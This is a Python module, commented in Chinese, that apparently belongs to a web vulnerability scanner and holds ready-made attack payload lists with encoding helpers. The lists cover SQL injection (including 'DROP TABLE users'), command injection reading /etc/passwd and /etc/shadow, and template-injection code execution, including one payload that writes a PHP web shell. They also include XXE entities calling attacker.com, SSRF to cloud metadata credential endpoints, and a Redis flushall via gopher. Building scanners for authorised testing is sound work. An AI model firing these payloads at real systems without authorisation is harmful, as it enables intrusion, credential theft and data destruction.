"""
Payload 管理器

集中管理各类漏洞检测的 payload，支持分类、编码变体和自定义加载
"""

from typing import List, Dict, Optional, Iterator, Set
from dataclasses import dataclass, field
from enum import Enum
import base64
import urllib.parse
import html
import logging
import os
import json

logger = logging.getLogger(__name__)


class PayloadCategory(Enum):
    """Payload 类别枚举"""
    SQLI = 'sqli'                    # SQL 注入
    XSS = 'xss'                      # 跨站脚本
    RCE = 'rce'                      # 命令注入
    SSTI = 'ssti'                    # 模板注入
    XXE = 'xxe'                      # XML 外部实体
    PATH_TRAVERSAL = 'path_traversal'  # 路径遍历
    SSRF = 'ssrf'                    # 服务端请求伪造
    LDAP = 'ldap'                    # LDAP 注入
    NOSQL = 'nosql'                  # NoSQL 注入
    IDOR = 'idor'                    # 不安全的直接对象引用
    OPEN_REDIRECT = 'open_redirect'  # 开放重定向
    CRLF = 'crlf'                    # CRLF 注入
    HEADER = 'header'                # HTTP 头注入
    LFI = 'lfi'                      # 本地文件包含
    FILE_UPLOAD = 'file_upload'      # 文件上传


class EncodingType(Enum):
    """编码类型"""
    RAW = 'raw'              # 原始
    URL = 'url'              # URL 编码
    DOUBLE_URL = 'double_url'  # 双重 URL 编码
    HTML = 'html'            # HTML 实体编码
    BASE64 = 'base64'        # Base64 编码
    UNICODE = 'unicode'      # Unicode 编码
    HEX = 'hex'              # 十六进制编码


@dataclass
class Payload:
    """Payload 定义"""
    value: str                              # payload 值
    category: PayloadCategory               # 类别
    name: Optional[str] = None              # 名称
    description: Optional[str] = None       # 描述
    tags: List[str] = field(default_factory=list)  # 标签
    severity: str = 'medium'                # 严重程度
    encoded_variants: List[str] = field(default_factory=list)  # 预计算的编码变体

    def __post_init__(self):
        if not self.name:
            self.name = f"{self.category.value}_{hash(self.value) % 10000}"


class PayloadEncoder:
    """Payload 编码器"""

    @staticmethod
    def encode(payload: str, encoding: EncodingType) -> str:
        """对 payload 进行编码

        Args:
            payload: 原始 payload
            encoding: 编码类型

        Returns:
            编码后的 payload
        """
        if encoding == EncodingType.RAW:
            return payload
        elif encoding == EncodingType.URL:
            return urllib.parse.quote(payload, safe='')
        elif encoding == EncodingType.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        elif encoding == EncodingType.HTML:
            return html.escape(payload)
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif encoding == EncodingType.UNICODE:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == EncodingType.HEX:
            return ''.join(f'%{ord(c):02x}' for c in payload)
        else:
            return payload

    @staticmethod
    def get_all_variants(payload: str, encodings: Optional[List[EncodingType]] = None) -> List[str]:
        """获取所有编码变体

        Args:
            payload: 原始 payload
            encodings: 要使用的编码类型列表

        Returns:
            编码变体列表
        """
        if encodings is None:
            encodings = [EncodingType.RAW, EncodingType.URL, EncodingType.DOUBLE_URL]

        variants = []
        seen: Set[str] = set()

        for encoding in encodings:
            encoded = PayloadEncoder.encode(payload, encoding)
            if encoded not in seen:
                variants.append(encoded)
                seen.add(encoded)

        return variants


# ==================== 默认 Payload 定义 ====================

# SQL 注入 Payload
SQLI_PAYLOADS = [
    # 基础探测
    "'",
    "\"",
    "'--",
    "\"--",
    "1'",
    "1\"",

    # OR 注入
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "or 1=1--",
    "' or ''='",
    "\" or \"\"=\"",

    # AND 注入
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",

    # 时间盲注
    "' AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND pg_sleep(5)--",

    # UNION 注入
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "1' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,2,3--",

    # ORDER BY 探测列数
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 10--",
    "1' ORDER BY 100--",

    # 报错注入
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

    # 堆叠查询
    "'; SELECT SLEEP(5);--",
    "'; DROP TABLE users;--",
    "'; INSERT INTO users VALUES('hacked','hacked');--",

    # 特殊字符
    "1/**/AND/**/1=1",
    "1'/**/AND/**/1=1--",
    "1'+AND+1=1--",
    "1'%20AND%201=1--",
]

# XSS Payload
XSS_PAYLOADS = [
    # 基础脚本
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",

    # 事件处理器
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe onload=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",

    # JavaScript 协议
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "javascript:alert(document.domain)",

    # 属性注入
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "' onfocus='alert(1)' autofocus='",

    # 标签闭合
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "--><script>alert(1)</script>",
    "]]><script>alert(1)</script>",

    # 大小写混淆
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x onerror=alert(1)>",
    "<SVG ONLOAD=alert(1)>",

    # 空字符绕过
    "<scr\x00ipt>alert(1)</script>",
    "<img src=x one\x00rror=alert(1)>",

    # 编码绕过
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",

    # DOM XSS
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",

    # 特殊标签
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<svg><desc><template><frameset><iframe srcdoc='<script>alert(1)</script>'>",
]

# 命令注入 Payload
RCE_PAYLOADS = [
    # Unix 命令
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",

    # 管道和重定向
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "; cat /etc/shadow",
    "; ls -la",
    "| ls -la",
    "; pwd",
    "| pwd",

    # 命令分隔
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)",

    # Windows 命令
    "& dir",
    "| dir",
    "; dir",
    "& whoami",
    "| whoami",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| type C:\\Windows\\win.ini",
    "& ping -n 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    "& timeout /t 5",

    # 换行符
    "\n id",
    "\r\n id",
    "%0a id",
    "%0d%0a id",

    # 空格绕过
    ";{id}",
    ";$IFS$9id",
    ";${IFS}id",
    "<id",
    ">id",

    # 引号逃逸
    "';id;'",
    "\";id;\"",
    "';id;#",
    "\";id;#",
]

# SSTI Payload
SSTI_PAYLOADS = [
    # 探测
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${7*'7'}",

    # Jinja2 (Python)
    "{{config}}",
    "{{self.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",

    # Twig (PHP)
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}",
    "{{app.request.server.all|join(',')}}",

    # Freemarker (Java)
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",

    # Velocity (Java)
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",

    # Smarty (PHP)
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",

    # Pebble (Java)
    "{% set cmd = 'id' %}{{ 'a]'.class.forName('java.lang.Runtime').getMethod('exec',[String.class]).invoke('a]'.class.forName('java.lang.Runtime').getMethod('getRuntime',[]).invoke(null),[cmd]).inputStream.text }}",

    # Mako (Python)
    "${self.module.cache.util.os.system('id')}",
    "${self.module.runtime.util.os.system('id')}",

    # Thymeleaf (Java)
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.",
    "*{T(java.lang.Runtime).getRuntime().exec('id')}",
]

# XXE Payload
XXE_PAYLOADS = [
    # 基础 XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',

    # 参数实体
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',

    # 外部 DTD
    '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo></foo>',

    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',

    # Blind XXE (OOB)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]><foo></foo>',

    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',

    # SVG XXE
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',

    # 编码绕过
    '<?xml version="1.0" encoding="UTF-16BE"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

# 路径遍历 Payload
PATH_TRAVERSAL_PAYLOADS = [
    # 基础遍历
    "../",
    "..\\",
    "../../../",
    "..\\..\\..\\",
    "....//",
    "....\\\\",

    # 读取敏感文件
    "../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../etc/hosts",
    "../../../proc/self/environ",

    # 编码绕过
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "..%252f..%252f..%252fetc%252fpasswd",

    # 空字节截断
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "..\\..\\..\\windows\\win.ini%00",
    "..\\..\\..\\windows\\win.ini%00.jpg",

    # 点过滤绕过
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",

    # 绝对路径
    "/etc/passwd",
    "c:\\windows\\win.ini",
    "file:///etc/passwd",
]

# SSRF Payload
SSRF_PAYLOADS = [
    # 内网探测
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://0.0.0.0",
    "http://0",

    # 内网 IP 段
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1",
    "http://192.168.1.1",

    # 云元数据
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",

    # 协议绕过
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",

    # DNS Rebinding
    "http://attacker.com.127.0.0.1.nip.io",

    # 编码绕过
    "http://127.1",
    "http://2130706433",  # 127.0.0.1 的十进制
    "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1 的十六进制
    "http://0177.0.0.1",  # 127.0.0.1 的八进制
    "http://[::1]",  # IPv6 本地回环
    "http://[0:0:0:0:0:ffff:127.0.0.1]",

    # 重定向绕过
    "http://attacker.com/redirect?url=http://169.254.169.254",
]

# LDAP 注入 Payload
LDAP_PAYLOADS = [
    "*",
    "*)(&",
    "*)(|",
    "*))%00",
    "*()|&'",
    "admin)(&)",
    "admin)(|(password=*))",
    "*)(uid=*))(|(uid=*",
    "x*)(|(objectclass=*)",
    "*)(|(cn=*))",
    "*))%00",
    "\\2a",
    "\\28",
    "\\29",
]

# NoSQL 注入 Payload
NOSQL_PAYLOADS = [
    # MongoDB
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$or": [{}]}',
    '[$gt]=',
    '[$ne]=',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',

    # JavaScript 注入
    "'; return true; var dummy='",
    "'; return this.password; var dummy='",
    '"; return true; var dummy="',
    "1; return true",
]

# 开放重定向 Payload
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "//evil.com/",
    "https://evil.com",
    "//evil%00.com",
    "//evil%E3%80%82com",
    "//%0d%0aevil.com",
    "//evil.com\\@trusted.com",
    "https://trusted.com@evil.com",
    "https://evil.com#trusted.com",
    "https://evil.com?trusted.com",
    "//google.com%2f%2fevil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

# CRLF 注入 Payload
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0d%0aX-Injected:header",
    "%0d%0a%0d%0a<html><body>Injected</body></html>",
    "\r\nSet-Cookie:crlf=injection",
    "\r\nX-Injected:header",
    "%0aSet-Cookie:crlf=injection",
    "%0aX-Injected:header",
    "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
]

# LFI 文件包含 Payload (包含 PHP Wrapper)
LFI_PAYLOADS = [
    # 基础路径遍历
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "/etc/passwd",
    # PHP Wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    # Windows
    "....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
]

# 文件上传 Payload (危险扩展名)
FILE_UPLOAD_PAYLOADS = [
    "test.php",
    "test.php.jpg",
    "test.phtml",
    "test.php%00.jpg",
    "test.phar",
    "test.jsp",
    "test.aspx",
    ".htaccess",
    "web.config",
]


class PayloadManager:
    """Payload 管理器

    集中管理所有类型的 payload，支持加载、编码和过滤

    使用示例:
        manager = PayloadManager()
        payloads = manager.get(PayloadCategory.SQLI, limit=10)

        # 获取带编码变体的 payload
        for payload in manager.get_with_variants(PayloadCategory.XSS):
            print(payload)
    """

    def __init__(self):
        """初始化管理器"""
        self._payloads: Dict[PayloadCategory, List[Payload]] = {}
        self._load_default_payloads()

    def _load_default_payloads(self) -> None:
        """加载默认 payload"""
        # 映射默认 payload 到类别
        defaults = {
            PayloadCategory.SQLI: SQLI_PAYLOADS,
            PayloadCategory.XSS: XSS_PAYLOADS,
            PayloadCategory.RCE: RCE_PAYLOADS,
            PayloadCategory.SSTI: SSTI_PAYLOADS,
            PayloadCategory.XXE: XXE_PAYLOADS,
            PayloadCategory.PATH_TRAVERSAL: PATH_TRAVERSAL_PAYLOADS,
            PayloadCategory.SSRF: SSRF_PAYLOADS,
            PayloadCategory.LDAP: LDAP_PAYLOADS,
            PayloadCategory.NOSQL: NOSQL_PAYLOADS,
            PayloadCategory.OPEN_REDIRECT: OPEN_REDIRECT_PAYLOADS,
            PayloadCategory.CRLF: CRLF_PAYLOADS,
            PayloadCategory.LFI: LFI_PAYLOADS,
            PayloadCategory.FILE_UPLOAD: FILE_UPLOAD_PAYLOADS,
        }

        for category, values in defaults.items():
            self._payloads[category] = [
                Payload(value=v, category=category)
                for v in values
            ]

    def get(
        self,
        category: PayloadCategory,
        limit: Optional[int] = None,
        tags: Optional[List[str]] = None
    ) -> List[str]:
        """获取指定类别的 payload

        Args:
            category: payload 类别
            limit: 最大数量限制
            tags: 标签过滤

        Returns:
            payload 字符串列表
        """
        payloads = self._payloads.get(category, [])

        # 标签过滤
        if tags:
            payloads = [p for p in payloads if any(t in p.tags for t in tags)]

        # 提取值
        values = [p.value for p in payloads]

        # 限制数量
        if limit and limit > 0:
            values = values[:limit]

        return values

    def get_payloads(
        self,
        category: PayloadCategory,
        limit: Optional[int] = None
    ) -> List[Payload]:
        """获取 Payload 对象列表

        Args:
            category: payload 类别
            limit: 最大数量限制

        Returns:
            Payload 对象列表
        """
        payloads = self._payloads.get(category, [])

        if limit and limit > 0:
            payloads = payloads[:limit]

        return payloads

    def get_with_variants(
        self,
        category: PayloadCategory,
        encodings: Optional[List[EncodingType]] = None,
        limit: Optional[int] = None
    ) -> Iterator[str]:
        """获取 payload 及其编码变体

        Args:
            category: payload 类别
            encodings: 编码类型列表
            limit: 最大数量限制

        Yields:
            payload 字符串（包含原始和编码变体）
        """
        payloads = self.get(category, limit)

        if encodings is None:
            encodings = [EncodingType.RAW, EncodingType.URL]

        seen: Set[str] = set()
        for payload in payloads:
            for encoding in encodings:
                encoded = PayloadEncoder.encode(payload, encoding)
                if encoded not in seen:
                    seen.add(encoded)
                    yield encoded

    def add(self, payload: Payload) -> None:
        """添加 payload

        Args:
            payload: Payload 对象
        """
        if payload.category not in self._payloads:
            self._payloads[payload.category] = []
        self._payloads[payload.category].append(payload)

    def add_bulk(self, category: PayloadCategory, values: List[str]) -> int:
        """批量添加 payload

        Args:
            category: 类别
            values: payload 值列表

        Returns:
            添加的数量
        """
        count = 0
        for value in values:
            if value not in self.get(category):
                self.add(Payload(value=value, category=category))
                count += 1
        return count

    def load_from_file(self, path: str, category: PayloadCategory) -> int:
        """从文件加载 payload

        Args:
            path: 文件路径（每行一个 payload 或 JSON 格式）
            category: payload 类别

        Returns:
            加载的数量
        """
        count = 0

        if not os.path.exists(path):
            logger.warning(f"Payload 文件不存在: {path}")
            return 0

        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read().strip()

                # 尝试 JSON 格式
                if content.startswith('[') or content.startswith('{'):
                    data = json.loads(content)
                    if isinstance(data, list):
                        for item in data:
                            if isinstance(item, str):
                                self.add(Payload(value=item, category=category))
                                count += 1
                            elif isinstance(item, dict):
                                self.add(Payload(
                                    value=item.get('value', ''),
                                    category=category,
                                    name=item.get('name'),
                                    description=item.get('description'),
                                    tags=item.get('tags', [])
                                ))
                                count += 1
                else:
                    # 逐行读取
                    for line in content.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.add(Payload(value=line, category=category))
                            count += 1

            logger.info(f"从 {path} 加载了 {count} 个 payload")
        except Exception as e:
            logger.error(f"加载 payload 文件失败: {e}")

        return count

    def export_to_file(self, path: str, category: PayloadCategory) -> int:
        """导出 payload 到文件

        Args:
            path: 文件路径
            category: payload 类别

        Returns:
            导出的数量
        """
        payloads = self.get(category)
        count = len(payloads)

        try:
            with open(path, 'w', encoding='utf-8') as f:
                for payload in payloads:
                    f.write(payload + '\n')
            logger.info(f"导出 {count} 个 payload 到 {path}")
        except Exception as e:
            logger.error(f"导出 payload 失败: {e}")
            return 0

        return count

    def count(self, category: Optional[PayloadCategory] = None) -> int:
        """统计 payload 数量

        Args:
            category: 类别（不指定则统计全部）

        Returns:
            payload 数量
        """
        if category:
            return len(self._payloads.get(category, []))
        return sum(len(v) for v in self._payloads.values())

    def categories(self) -> List[PayloadCategory]:
        """获取所有类别

        Returns:
            类别列表
        """
        return list(self._payloads.keys())


# 全局管理器实例
_manager: Optional[PayloadManager] = None


def get_payload_manager() -> PayloadManager:
    """获取全局 payload 管理器

    Returns:
        PayloadManager 实例
    """
    global _manager
    if _manager is None:
        _manager = PayloadManager()
    return _manager


def get_payloads(
    category: PayloadCategory,
    limit: Optional[int] = None
) -> List[str]:
    """获取指定类别的 payload（便捷函数）

    Args:
        category: payload 类别
        limit: 最大数量限制

    Returns:
        payload 字符串列表
    """
    return get_payload_manager().get(category, limit)


def get_payloads_with_variants(
    category: PayloadCategory,
    encodings: Optional[List[EncodingType]] = None,
    limit: Optional[int] = None
) -> List[str]:
    """获取 payload 及其编码变体（便捷函数）

    Args:
        category: payload 类别
        encodings: 编码类型列表
        limit: 最大数量限制

    Returns:
        payload 字符串列表
    """
    return list(get_payload_manager().get_with_variants(category, encodings, limit))
